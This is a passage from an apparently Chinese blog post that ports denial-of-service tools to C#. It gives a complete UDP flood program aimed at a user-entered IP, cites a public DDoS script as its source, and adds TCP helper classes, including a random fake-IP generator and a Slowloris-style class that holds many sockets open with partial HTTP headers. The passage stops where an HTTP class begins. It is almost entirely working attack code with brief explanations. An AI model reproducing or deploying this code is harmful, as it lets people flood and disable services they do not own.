class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.Clear();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;UDP Flood Attack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取目标 IP 和端口</span></span><br><span class="line">        Console.Write(<span class="string">&quot;IP Target : &quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> ip = Console.ReadLine();</span><br><span class="line">        Console.Write(<span class="string">&quot;Port      : &quot;</span>);</span><br><span class="line">        <span class="built_in">int</span> port = <span class="built_in">int</span>.Parse(Console.ReadLine());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备 UDP 客户端</span></span><br><span class="line">        UdpClient udpClient = <span class="keyword">new</span> UdpClient();</span><br><span class="line">        <span class="built_in">byte</span>[] bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1490</span>];</span><br><span class="line">        <span class="keyword">new</span> Random().NextBytes(bytes); <span class="comment">// 生成随机字节数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟进度条</span></span><br><span class="line">        Console.Clear();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Attack Starting&quot;</span>);</span><br><span class="line">        ShowProgressBar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始发送 UDP 数据包</span></span><br><span class="line">        <span class="built_in">int</span> sent = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                udpClient.Send(bytes, bytes.Length, ip, port);</span><br><span class="line">                sent++;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Sent <span class="subst">&#123;sent&#125;</span> packets to <span class="subst">&#123;ip&#125;</span> through port: <span class="subst">&#123;port&#125;</span>&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 增加端口号</span></span><br><span class="line">                port++;</span><br><span class="line">                <span class="keyword">if</span> (port &gt; <span class="number">65534</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    port = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ShowProgressBar</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span>[] delays = &#123; <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span> &#125;;</span><br><span class="line">        <span class="built_in">string</span>[] progress = &#123;</span><br><span class="line">            <span class="string">&quot;[                    ] 0% &quot;</span>,</span><br><span class="line">            <span class="string">&quot;[=====               ] 25%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[==========          ] 50%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[===============     ] 75%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[====================] 100%&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; progress.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(progress[i]);</span><br><span class="line">            <span class="keyword">if</span> (i &lt; delays.Length)</span><br><span class="line">            &#123;</span><br><span class="line">                Thread.Sleep(delays[i] * <span class="number">1000</span>); <span class="comment">// 模拟延迟</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>UDP 数据包发送：</strong></p><p>使用 C# 的 UdpClient 类发送 UDP 数据包。<br>数据包内容为随机字节，通过 Random.NextBytes() 填充。<br>进度条显示： 模拟了攻击启动的加载进度，类似原始 Python 代码中的进度条。</p><h1 id="端口递增逻辑："><a href="#端口递增逻辑：" class="headerlink" title="端口递增逻辑："></a>端口递增逻辑：</h1><p>每次发送数据包后，端口号加 1。<br>超过 65534 时，重置为 1。</p><p>参考：<br><a class="link"   href="https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py" >https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py<i class="fas fa-external-link-alt"></i></a></p><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> dstools</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">ds</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">AddBots</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; bots = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            bots.Add(<span class="string">&quot;http://www.bing.com/search?q=%40&amp;count=50&amp;first=0&quot;</span>);</span><br><span class="line">            bots.Add(<span class="string">&quot;http://www.google.com/search?hl=en&amp;num=100&amp;q=intext%3A%40&amp;ie=utf-8&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> bots;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">AddUserAgent</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; uagents = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span>[] lines = [<span class="string">&quot;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0&quot;</span>];</span><br><span class="line">                <span class="comment">//System.IO.File.ReadAllLines(&quot;ua.txt&quot;);</span></span><br><span class="line">                uagents.AddRange(lines);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (FileNotFoundException)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.ForegroundColor = ConsoleColor.Yellow;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;[-] No file named &#x27;ua.txt&#x27;,failed to load User-Agents&quot;</span>);</span><br><span class="line">                Console.ResetColor();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> uagents;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IPAddress <span class="title">CheckTgt</span>(<span class="params"><span class="built_in">string</span> tgt</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                IPHostEntry hostEntry = Dns.GetHostEntry(tgt);</span><br><span class="line">                <span class="keyword">return</span> hostEntry.AddressList[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;[-] Can&#x27;t resolve host:Unknown host!&quot;</span>);</span><br><span class="line">                Console.ResetColor();</span><br><span class="line">                Environment.Exit(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">FakeIP</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="built_in">string</span>[] ips = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> num = random.Next(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">                <span class="keyword">if</span> (num == <span class="number">127</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ips[i] = num.ToString();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">string</span>.Join(<span class="string">&quot;.&quot;</span>, ips);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网络数据类"><a href="#网络数据类" class="headerlink" title="网络数据类"></a>网络数据类</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Pyslow</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> tgt;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> port;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> to;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> threads;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> sleep;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span>[] method = &#123; <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span> &#125;;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> pkt_count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Pyslow</span>(<span class="params"><span class="built_in">string</span> tgt, <span class="built_in">int</span> port, <span class="built_in">float</span> to, <span class="built_in">int</span> threads, <span class="built_in">int</span> sleep</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.tgt = tgt;</span><br><span class="line">            <span class="keyword">this</span>.port = port;</span><br><span class="line">            <span class="keyword">this</span>.to = to;</span><br><span class="line">            <span class="keyword">this</span>.threads = threads;</span><br><span class="line">            <span class="keyword">this</span>.sleep = sleep;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">MyPkt</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="built_in">string</span> text = method[random.Next(<span class="number">0</span>, method.Length)] + <span class="string">&quot; /&quot;</span> + random.Next(<span class="number">1</span>, <span class="number">999999999</span>).ToString() + <span class="string">&quot; HTTP/1.1\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;Host:&quot;</span> + tgt + <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;User-Agent:&quot;</span> +ds. AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)] + <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;Content-Length: 42\r\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> Encoding.ASCII.GetBytes(text);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Socket <span class="title">BuildingSocket</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Socket sock = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    sock.Send(MyPkt());</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, <span class="number">-1</span>);</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    sock.Send(MyPkt());</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendingPackets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Socket sock = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">byte</span>[] data = Encoding.ASCII.GetBytes(<span class="string">&quot;X-a: b\r\n&quot;</span>);</span><br><span class="line">                    sock.Send(data);</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, <span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">byte</span>[] data = Encoding.ASCII.GetBytes(<span class="string">&quot;X-a: b\r\n&quot;</span>);</span><br><span class="line">                    sock.Send(data);</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoConnection</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> socks = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">int</span> fail = <span class="number">0</span>;</span><br><span class="line">            List&lt;Socket&gt; lsocks = <span class="keyword">new</span> List&lt;Socket&gt;();</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Blue;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t\tBuilding sockets&quot;</span>);</span><br><span class="line">            Console.ResetColor();</span><br><span class="line">            <span class="keyword">while</span> (socks &lt; threads)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Socket sock = BuildingSocket();</span><br><span class="line">                    <span class="keyword">if</span> (sock != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        lsocks.Add(sock);</span><br><span class="line">                        socks++;</span><br><span class="line">                        <span class="keyword">if</span> (socks &gt; threads)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    fail++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Blue;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t\tSending packets&quot;</span>);</span><br><span class="line">            Console.ResetColor();</span><br><span class="line">            <span class="keyword">while</span> (socks &lt; threads)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    SendingPackets();</span><br><span class="line">                    socks++;</span><br><span class="line">                    <span class="keyword">if</span> (socks &gt; threads)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    fail++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.Write(<span class="string">&quot;I have sent &quot;</span>);</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Cyan;</span><br><span class="line">            Console.Write(pkt_count.ToString());</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.Write(<span class="string">&quot; packets successfully.Now i&#x27;m going to sleep for &quot;</span>);</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">            Console.Write(sleep.ToString());</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot; second&quot;</span>);</span><br><span class="line">            Thread.Sleep(sleep * <span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="http类"><a href="#http类" class="headerlink" title="http类"></a>http类</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td 